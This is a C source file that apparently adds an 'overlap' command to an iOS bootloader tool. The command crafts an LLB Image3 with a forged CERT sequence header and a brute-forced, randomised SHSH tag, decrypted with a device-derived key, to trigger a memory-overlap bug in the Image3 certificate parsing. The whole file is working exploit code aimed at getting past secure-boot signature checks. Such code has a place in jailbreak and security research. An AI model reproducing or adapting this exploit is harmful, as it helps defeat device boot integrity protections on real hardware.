#include <cmd.h>
#include <aes.h>
#include <der.h>
#include <libc.h>
#include <random.h>
#include <image3.h>

#define NUM_OF_ATTEMPTS 50
#define SHSH_TAG_LENGTH 0x74

static const uint8_t derivedSeed[] = {0xdb, 0x1f, 0x5b, 0x33, 0x60, 0x6c, 0x5f, 0x1c,
                                      0x19, 0x34, 0xaa, 0x66, 0x58, 0x9c, 0x06, 0x61};

static const char epic_str[] = "OH WHAT THE HELL?!";

int do_overlap(int argc, struct cmd_arg *args) {
    off_t target_addr;
    void *dest_addr;

    switch (argc) {
        case 2:
            target_addr = args[1].u;
            dest_addr = (void *)TARGET_LOADADDR;
            break;

        case 3:
            target_addr = args[1].u;
            dest_addr = (void *)args[2].u;
            break;

        default:
            printf("overlap target_addr [dest_addr]\n");
            return ENOARG;
    }

    uint8_t random[SHSH_TAG_LENGTH];
    random_get_bytes((uint8_t *)&random, sizeof(random));

    image3_handle_t *handle = image3_new(LLB_IDENT);
    image3_add_tag(handle, image3_tag_new(DATA_TAG_IDENT, (void *)&epic_str, sizeof(epic_str) - 1));
    image3_add_tag(handle, image3_tag_new(SHSH_TAG_IDENT, (void *)&random, sizeof(random)));

    size_t current_size = image3_calculate(handle);
    
    off_t current_ptr = TARGET_SRAMADDR + current_size + sizeof(image3_tag_header_t);
    size_t required_size = target_addr - current_ptr - DER_SEQUENCE_HEADER_4_LEN;

    printf("cert start: 0x%x\n", current_ptr);
    printf("required size: 0x%x\n", required_size);

    uint8_t seq_header[DER_SEQUENCE_HEADER_4_LEN];
    der_sequence_header((uint8_t *)&seq_header, required_size);

    image3_add_tag(handle, image3_tag_new(CERT_TAG_IDENT, (void *)&seq_header, sizeof(seq_header)));

    current_size = image3_calculate(handle);

    image3_generate(handle, dest_addr);
    image3_free(handle, false);

    image3_tag_header_t *shsh_header = image3_get_tag_struct((image3_header_t *)dest_addr, SHSH_TAG_IDENT);
    if (!shsh_header) {
        printf("something went absolutely wrong\n");
        return EFAILURE;
    }

    shsh_header->data_size += sizeof(image3_tag_header_t);

    uint8_t personalized_key[16];
    if (aes_crypto_cmd(kAESEncrypt, (void *)&derivedSeed, &personalized_key, sizeof(personalized_key), kAESTypeSHSH, 0, 0) != 0) {
        printf("cannot get personalized key\n");
        return EFAILURE;
    }

    uint8_t *decryption_buffer = malloc(shsh_header->data_size);

    int result;

    for (int i = 0; i < NUM_OF_ATTEMPTS; i++) {
        if (aes_crypto_cmd(kAESDecrypt, &shsh_header->data, decryption_buffer, shsh_header->data_size, kAESTypeNormal, (void *)&personalized_key, 0) != 0) {
            printf("cannot decrypt SHSH\n");
            return EFAILURE;
        }

        uint32_t cert_len_result = *(uint32_t *)(decryption_buffer + shsh_header->data_size - 4);

        printf("attempt %d: 0x%x\n", i, cert_len_result);

        if (cert_len_result > required_size) {
            printf("found! took %d attempts\n", i + 1);
            printf("resulting Image3 is %d bytes of size\n", current_size);
            result = ESUCCESS;
            goto out;
        } else {
            random_get_bytes((uint8_t *)&shsh_header->data, SHSH_TAG_LENGTH);
        }
    }

    printf("couldn't find in %d attempts\n", NUM_OF_ATTEMPTS);
    result = EFAILURE;

out:
    free(decryption_buffer);

    return result;
}

MENU_COMMAND("overlap", do_overlap, "generate an Image3 for triggering the overlap bug");
